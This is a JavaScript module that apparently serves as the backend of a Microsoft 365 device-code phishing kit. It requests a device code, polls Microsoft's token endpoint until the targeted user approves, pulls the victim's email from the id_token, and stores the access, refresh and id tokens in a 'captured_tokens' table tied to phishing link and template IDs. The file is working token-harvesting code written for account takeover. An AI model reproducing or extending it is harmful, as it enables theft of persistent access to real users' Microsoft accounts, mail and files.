const axios = require('axios');
const db = require('../database/connection');
const { encrypt } = require('../utils/encrypt');
const config = require('../config/env');

const TENANT = config.AZURE_TENANT || 'common';
const CLIENT_ID = config.AZURE_CLIENT_ID;

async function requestDeviceCode() {
  const response = await axios.post(
    `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`,
    new URLSearchParams({
      client_id: CLIENT_ID,
      resource: 'https://graph.microsoft.com',
    }),
    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
  );
  
  return {
    device_code: response.data.device_code,
    user_code: response.data.user_code,
    verification_uri: response.data.verification_uri,
    expires_in: response.data.expires_in,
    interval: response.data.interval || 5,
    message: response.data.message,
  };
}

async function pollForTokens(deviceCode, linkId, userId) {
  const maxAttempts = 60;
  let attempts = 0;
  
  while (attempts < maxAttempts) {
    attempts++;
    await new Promise(resolve => setTimeout(resolve, 5000));
    
    try {
      const response = await axios.post(
        `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: CLIENT_ID,
          device_code: deviceCode,
        }),
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
      );
      
      // Tokens received
      const { access_token, refresh_token, id_token, scope } = response.data;
      
      // Decode id_token for email
      let email = null;
      if (id_token) {
        try {
          const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
          email = payload.email || payload.upn || payload.preferred_username || null;
        } catch (e) { /* ignore decode errors */ }
      }
      
      // Determine tenant from config
      const tenant = config.AZURE_TENANT || 'common';
      
      // Store encrypted
      await db.query(
        'INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration, tenant, template_type) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?)',
        [
          userId, linkId, email, 'token',
          encrypt(access_token), encrypt(refresh_token), encrypt(id_token),
          '0.0.0.0', 'Device Code Flow',
          tenant, 'office'
        ]
      );
      
      return { success: true, email, access_token, refresh_token };
    } catch (err) {
      if (err.response?.data?.error === 'authorization_pending') {
        continue;
      } else if (err.response?.data?.error === 'authorization_declined') {
        return { success: false, error: 'User declined authorization' };
      } else if (err.response?.data?.error === 'expired_token') {
        return { success: false, error: 'Code expired' };
      } else if (attempts >= maxAttempts) {
        return { success: false, error: 'Timeout waiting for user' };
      }
    }
  }
  
  return { success: false, error: 'Timeout' };
}

module.exports = { requestDeviceCode, pollForTokens };
